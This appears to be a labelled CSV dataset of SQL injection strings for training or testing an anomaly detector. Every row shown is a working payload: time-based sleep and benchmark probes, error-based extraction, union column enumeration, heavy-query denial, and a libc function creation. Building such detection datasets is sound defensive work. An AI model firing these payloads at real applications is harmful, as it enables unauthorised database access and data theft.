Query,Length,Attack,Label
1) rlike sleep(5),17,sqli,anom
"1';select count(*) from generate_series(1,5000000)--",52,sqli,anom
"1%""));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((""%""=""",112,sqli,anom
"1'||(select 'ussi' where 8958=8958;select benchmark(5000000,md5(0x4c4d6142)))||'",80,sqli,anom
"-8919"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""nstr""=""nstr",225,sqli,anom
"1 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)",76,sqli,anom
"1"") and 4595=4595#",18,sqli,anom
-4057') order by 1#,19,sqli,anom
"1"") and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""fpqh""=""fpqh",115,sqli,anom
"1') union all select null,null,null,null,null,null,null--",57,sqli,anom
-6327')) union all select 2685--,32,sqli,anom
"1"") as ymto where 3453=3453;select benchmark(5000000,md5(0x4c4d6142))--",71,sqli,anom
"1) or elt(5873=5873,sleep(5))#",30,sqli,anom
"1') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('cssb'='cssb",82,sqli,anom
"1%""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",122,sqli,anom
"1))) union all select null,null,null,null,null,null,null#",57,sqli,anom
"1%')));select count(*) from generate_series(1,5000000)--",56,sqli,anom
"1""""(.'.(,(.",11,sqli,anom
"1');select * from generate_series(3427,3427,case when (3427=7516) then 1 else 0 end) limit 1--",94,sqli,anom
"1"") where 4567=4567 or 8156=(select count(*) from generate_series(1,5000000))--",79,sqli,anom
-5820')) as lkik where 4044=4044 or 7156=9197--,47,sqli,anom
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'mvkg'='mvkg",112,sqli,anom
"1' where 4388=4388;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",103,sqli,anom
"1') as kqbh where 6138=6138;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",128,sqli,anom
"1');call regexp_substring(repeat(right(char(3702),0),500000000),null)",69,sqli,anom
"-7916')) union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",76,sqli,anom
"1"" and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""bzzt"" like ""bzzt",205,sqli,anom
"1%') and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",107,sqli,anom
"1 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))-- gkcl",204,sqli,anom
1');select (case when (7217=7631) then 7217 else 7217*(select 7217 from information_schema.character_sets) end)#,112,sqli,anom
"-5288') or make_set(1164=1710,1710) and ('pkwy'='pkwy",53,sqli,anom
"1"") where 6679=6679 rlike sleep(5)#",35,sqli,anom
"1"") and 8407=(select count(*) from generate_series(1,5000000)) and (""kssm""=""kssm",80,sqli,anom
"-1894') union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",70,sqli,anom
"1' where 9605=9605 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",150,sqli,anom
"1"")) and (1248=8705)*8705 and ((""wvma"" like ""wvma",49,sqli,anom
"1"") and (4085=4885)*4885 and (""sxte""=""sxte",42,sqli,anom
"1"" where 1982=1982;(select * from (select(sleep(5)))acdk)#",58,sqli,anom
"1 or elt(6272=6272,sleep(5))# klaw",34,sqli,anom
"1',(select (case when (5249=9648) then 1 else 1/(select 0) end))",64,sqli,anom
"1' in boolean mode) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))#",216,sqli,anom
1)) rlike (select * from (select(sleep(5)))vwyq)#,49,sqli,anom
"1') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('opll' like 'opll",129,sqli,anom
"1)) and 8407=(select count(*) from generate_series(1,5000000)) and ((4450=4450",78,sqli,anom
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",123,sqli,anom
"1%'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('%'='",158,sqli,anom
"1%');select benchmark(5000000,md5(0x4c4d6142)) and ('%'='",57,sqli,anom
"-6906' where 1839=1839 union all select 1839,1839,1839,1839,1839--",66,sqli,anom
"1""))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""cwpt"" like ""cwpt",136,sqli,anom
"1"") where 2312=2312 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",192,sqli,anom
"1%"")) union all select null,null,null,null,null,null--",54,sqli,anom
-2797'))) union all select 5711#,32,sqli,anom
1') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('bmhw' like 'bmhw,258,sqli,anom
"1"" or 8156=(select count(*) from generate_series(1,5000000))--",62,sqli,anom
"1%""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((""%""=""",103,sqli,anom
1 and (3020=3020)*6703# syuj,28,sqli,anom
"1%""))) union all select null,null,null,null,null,null,null--",60,sqli,anom
"1'||(select 'ghby' from dual where 4854=4854;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",129,sqli,anom
"1"") or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""vkqt""=""vkqt",81,sqli,anom
"1%')) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",67,sqli,anom
1') and 8404=8651#,18,sqli,anom
1) as rqac where 3381=3381 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,122,sqli,anom
"-7008')) union all select 9080,9080,9080#",41,sqli,anom
"1 or elt(6272=6272,sleep(5))",28,sqli,anom
"1) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",95,sqli,anom
"1')) and 3824=benchmark(5000000,md5(0x76555642)) and (('obeh'='obeh",67,sqli,anom
1'+(select 'yahd' where 5850=5850;select sleep(5)#,50,sqli,anom
"1')) as cimd where 9608=9608;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",129,sqli,anom
1' and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'oofd'='oofd,222,sqli,anom
"1')) as peeo where 5356=5356 and elt(4722=2382,2382)--",54,sqli,anom
"1')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('aumk' like 'aumk",88,sqli,anom
"1' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)",203,sqli,anom
-2749') as fiho where 3531=3531 or 2777=1485#,45,sqli,anom
"-4826 union all select 4532,4532,4532,4532,4532--",49,sqli,anom
-1643' where 1968=1968 or 3484=6642,35,sqli,anom
"-4586') as shdb where 6176=6176 union all select 6176,6176,6176,6176#",69,sqli,anom
1) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (9932=9932,204,sqli,anom
"-6770')) union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",71,sqli,anom
-7041') where 6307=6307 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,118,sqli,anom
1' rlike (select * from (select(sleep(5)))sgvo) and 'mabd'='mabd,64,sqli,anom
-3559') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq'),100,sqli,anom
"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",66,sqli,anom
"1) where 6990=6990 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",171,sqli,anom
"1)) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((5776=5776",175,sqli,anom
1')) as jzoh where 6484=6484 and 7364=4233--,44,sqli,anom
"1'||(select 'eamo' where 4958=4958 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5))||'",113,sqli,anom
1)));begin dbms_lock.sleep(5); end and (((4675=4675,51,sqli,anom
"1'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (('wyvx'='wyvx",138,sqli,anom
"1"")) as ltco where 3862=3862 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",126,sqli,anom
1) where 4653=4653 or 6793=(select 6793 from pg_sleep(5))--,59,sqli,anom
"1"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""mkal"" like ""mkal",113,sqli,anom
"1') and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('xonc'='xonc",177,sqli,anom
"1"" where 1386=1386;select (case when (3435=4011) then 1 else 3435*(select 3435 from master..sysdatabases) end)--",112,sqli,anom
"1')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('dkra' like 'dkra",128,sqli,anom
"1 or 8156=(select count(*) from generate_series(1,5000000))--",61,sqli,anom
"1) as dqda where 1624=1624 and 8635=(select count(*) from generate_series(1,5000000))--",87,sqli,anom
-8397'))) or 2171=4788,22,sqli,anom
"1""));select case when 1802=7063 then 1 else null end--",54,sqli,anom
"1"") or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""vudj"" like ""vudj",119,sqli,anom
"1)) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((8965=8965",110,sqli,anom
"1"")) as turj where 1237=1237;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",145,sqli,anom
"1'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('crus'='crus",180,sqli,anom
"1"" and 2388=benchmark(5000000,md5(0x6d457153))#",47,sqli,anom
"1' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and 'esjl'='esjl",110,sqli,anom
"-7656""))) union all select 3172,3172,3172,3172,3172,3172,3172,3172,3172,3172--",78,sqli,anom
"1' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and 'sloy'='sloy",221,sqli,anom
"1') and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",174,sqli,anom
-7242' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'kfff'='kfff,254,sqli,anom
"1') or 8466=benchmark(5000000,md5(0x694a4745)) and ('osov' like 'osov",69,sqli,anom
"1"" or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",104,sqli,anom
"1"")) union all select null,null,null,null,null,null#",52,sqli,anom
1'+(select 'rpds' where 5870=5870 and 4595=4595#,48,sqli,anom
"-4692%"")) union all select 1781,1781#",37,sqli,anom
"1' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",63,sqli,anom
"1"")) as klie where 2840=2840 or 8514=benchmark(5000000,md5(0x544d5a4c))#",72,sqli,anom
"-4056""))) union all select 4363,4363,4363,4363,4363,4363,4363,4363#",67,sqli,anom
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",158,sqli,anom
"1"" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)",234,sqli,anom
-7951'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('blak'='blak,209,sqli,anom
-7231)) union all select 7639#,30,sqli,anom
"1%"") union all select null#",27,sqli,anom
"1%"") union all select null,null,null,null,null,null,null,null,null#",67,sqli,anom
"1"" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ""oyuj""=""oyuj",122,sqli,anom
"1' where 3362=3362;iif(5257=5257,1,1/0)",39,sqli,anom
"1""))) union all select null#",28,sqli,anom
"1' where 2202=2202 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",171,sqli,anom
"-6600') union all select 5566,5566#",35,sqli,anom
"-5145' where 2334=2334 union all select 2334,2334,2334,2334--",61,sqli,anom
1'+(select ggah where 3263=3263 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'))+',128,sqli,anom
"1' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and 'bxjo' like 'bxjo",125,sqli,anom
"1))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((4858=4858",81,sqli,anom
1') and 7533=7533 and ('dbjq'='dbjq,35,sqli,anom
"1 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)# mafe",137,sqli,anom
"1)) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((9313=9313",215,sqli,anom
"1))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((6578=6578",96,sqli,anom
1 where 7021=7021 or 6793=(select 6793 from pg_sleep(5))--,58,sqli,anom
"1)))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((3950=3950",218,sqli,anom
"1') as idqc where 5288=5288 and elt(1210=1210,sleep(5))--",57,sqli,anom
"-5235) or make_set(9354=9354,7185)",34,sqli,anom
"1'))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((('zxrb'='zxrb",227,sqli,anom
"1' where 8869=8869 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",94,sqli,anom
1 and 7533=7533,15,sqli,anom
"1) and make_set(8403=8403,8899)",31,sqli,anom
"1%""))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((""%""=""",94,sqli,anom
1%'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('%'=',251,sqli,anom
"1)) as zkrr where 4730=4730 or 8466=benchmark(5000000,md5(0x694a4745))--",72,sqli,anom
"1"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",110,sqli,anom
-6109 union all select 6784--,29,sqli,anom
"-5227"" union all select 2666--",30,sqli,anom
"1'+(select xwcl where 7997=7997;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",116,sqli,anom
"1) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",100,sqli,anom
"1) as zelk where 1944=1944 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",168,sqli,anom
"1%"")) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",146,sqli,anom
1))) or sleep(5) and (((2209=2209,33,sqli,anom
"1' in boolean mode);call regexp_substring(repeat(right(char(2385),0),500000000),null)--",87,sqli,anom
"1%"";waitfor delay '0:0:5' and ""%""=""",35,sqli,anom
"1%') or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",142,sqli,anom
"1"") or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (""igop""=""igop",112,sqli,anom
"1"" where 3274=3274 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",190,sqli,anom
"1"")));waitfor delay '0:0:5'--",29,sqli,anom
"1') union all select null,null,null,null#",41,sqli,anom
"-3230"")) as kbxc where 5007=5007 or 2107=8818",45,sqli,anom
1') waitfor delay '0:0:5' and ('fpnh'='fpnh,43,sqli,anom
"1%' union all select null,null,null,null,null,null,null,null,null--",67,sqli,anom
1%') and 6969=(select 6969 from pg_sleep(5)) and ('%'=',55,sqli,anom
"1'))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('hryb'='hryb",131,sqli,anom
"1'))) or 8156=(select count(*) from generate_series(1,5000000))--",65,sqli,anom
"1;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",69,sqli,anom
"1"") as hfgk where 1100=1100 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",136,sqli,anom
"1'+(select bptu where 7356=7356 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))))+'",232,sqli,anom
1' in boolean mode) union all select null--,43,sqli,anom
"1"" where 9829=9829 order by 1#",30,sqli,anom
"1') as elnu where 5719=5719 or 8156=(select count(*) from generate_series(1,5000000))--",87,sqli,anom
1) where 1402=1402;select sleep(5)#,35,sqli,anom
"1') as nmzp where 3794=3794 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",180,sqli,anom
"-1525'))) union all select 4110,4110,4110,4110,4110,4110#",57,sqli,anom
"1);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (3770=3770",100,sqli,anom
"1') where 7887=7887 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",113,sqli,anom
"1"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""mbas""=""mbas",206,sqli,anom
-1468'))) or 4875=6163#,23,sqli,anom
"-9572%"") or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",214,sqli,anom
"-9451%"") union all select 9963,9963,9963--",42,sqli,anom
1') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('svhx'='svhx,202,sqli,anom
"1"");begin user_lock.sleep(5); end--",35,sqli,anom
-8099%')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'=',223,sqli,anom
"-1164"") union all select 6617,6617,6617,6617,6617,6617--",56,sqli,anom
1) order by 1--,15,sqli,anom
"1') where 6489=6489 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",112,sqli,anom
1 where 6827=6827;select case when 7717=7717 then 1 else null end--,67,sqli,anom
"1%""))) and (3502=7893)*7893 and (((""%""=""",40,sqli,anom
"1') and make_set(8403=8403,8899) and ('kyxl'='kyxl",50,sqli,anom
"-2979')) as klou where 7092=7092 union all select 7092,7092--",61,sqli,anom
"-8448%"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""%""=""",219,sqli,anom
"1"" union all select null--",26,sqli,anom
"-1620)) union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",76,sqli,anom
"-2319 union all select 5068,5068,5068#",38,sqli,anom
"1"" or elt(6272=6272,sleep(5))",29,sqli,anom
"1""));select pg_sleep(5)--",25,sqli,anom
"1' where 1085=1085 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",120,sqli,anom
-3304')) order by 1--,21,sqli,anom
"1""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""adwg"" like ""adwg",135,sqli,anom
"1%"")) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",112,sqli,anom
"1%"") union all select null,null,null,null,null#",47,sqli,anom
1') where 8776=8776 and 6969=(select 6969 from pg_sleep(5))--,61,sqli,anom
"-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#",69,sqli,anom
"1%"")) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""%""=""",188,sqli,anom
-3862') or 9323=9323#,21,sqli,anom
"-8425"")) or (6485=1127)*1127 and ((""qruf""=""qruf",47,sqli,anom
1');select pg_sleep(5)--,24,sqli,anom
"-2106"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""dvlq"" like ""dvlq",226,sqli,anom
"1%') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('%'='",217,sqli,anom
"1"") as gdcx where 2335=2335 and 6969=(select 6969 from pg_sleep(5))--",69,sqli,anom
"1) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",102,sqli,anom
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'tmwy'='tmwy",175,sqli,anom
"1') and 8635=(select count(*) from generate_series(1,5000000))--",64,sqli,anom
"1'))) union all select null,null,null,null,null,null,null,null,null,null--",74,sqli,anom
1 rlike (select * from (select(sleep(5)))sgvo)# ewsz,52,sqli,anom
"1""))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((""text"" like ""text",90,sqli,anom
"-8203)) as eqlf where 6132=6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132--",95,sqli,anom
"1') where 9304=9304 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",81,sqli,anom
"1 where 8398=8398;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",114,sqli,anom
1 where 5161=5161 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,251,sqli,anom
1%') and 2006=2006,18,sqli,anom
"1' where 1628=1628 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",171,sqli,anom
"1) as qjbd where 2808=2808 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",215,sqli,anom
"1"");select (case when (2676=4191) then 2676 else 1/(select 0) end)--",68,sqli,anom
"1')) or elt(6272=6272,sleep(5)) and (('zjel' like 'zjel",55,sqli,anom
1')) as txxn where 7884=7884 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,211,sqli,anom
"1') as wtfo where 5666=5666 union all select null,null,null,null--",66,sqli,anom
-5299 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),185,sqli,anom
1 where 8532=8532;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,82,sqli,anom
1') where 9538=9538;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,113,sqli,anom
"1%')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",91,sqli,anom
"1""))) or sleep(5)#",18,sqli,anom
"1"" or 8466=benchmark(5000000,md5(0x694a4745)) and ""vnei"" like ""vnei",67,sqli,anom
"1"")) as ylah where 9248=9248;select pg_sleep(5)--",49,sqli,anom
-3834')) as hhiy where 2086=2086 or 3038=3038,45,sqli,anom
"-4236') union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",75,sqli,anom
-2241) where 7606=7606 or (8459=8459)*4906--,44,sqli,anom
1')) as wqhm where 9871=9871;(select * from (select(sleep(5)))srmq)--,69,sqli,anom
1)) as rcbz where 4563=4563 and 2006=2006,41,sqli,anom
"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",63,sqli,anom
